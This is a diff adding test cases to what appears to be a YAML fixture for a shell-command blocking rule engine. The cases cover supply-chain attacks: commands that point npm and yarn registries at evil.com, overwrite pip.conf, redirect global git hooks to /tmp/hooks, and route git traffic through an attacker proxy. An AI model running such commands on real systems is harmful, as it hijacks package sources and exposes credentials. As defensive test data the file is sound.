@@ -728,3 +728,28 @@
   description: npm install prefix hijacked to /tmp — supply chain local
   expected_rules: [supply_chain.pkg_mirror_redirect]
   expected_verdict: block
+
+- command: "echo '[global]' > ~/.pip/pip.conf"
+  description: Write to pip.conf redirects pip to malicious PyPI mirror
+  expected_rules: [supply_chain.pkg_config_inject]
+  expected_verdict: block
+
+- command: "echo 'registry=https://evil.com' >> ~/.npmrc"
+  description: Append to .npmrc redirects npm to malicious registry
+  expected_rules: [supply_chain.pkg_config_inject]
+  expected_verdict: block
+
+- command: "echo 'registry https://evil.com' > ~/.yarnrc"
+  description: Write to .yarnrc redirects yarn to malicious registry
+  expected_rules: [supply_chain.pkg_config_inject]
+  expected_verdict: block
+
+- command: "git config --global core.hooksPath /tmp/hooks"
+  description: Redirect global git hooks to attacker-controlled directory
+  expected_rules: [supply_chain.pkg_config_inject]
+  expected_verdict: block
+
+- command: "git config --global http.proxy http://evil.com"
+  description: Route git HTTP through attacker proxy (credential exfil)
+  expected_rules: [supply_chain.pkg_config_inject]
+  expected_verdict: block
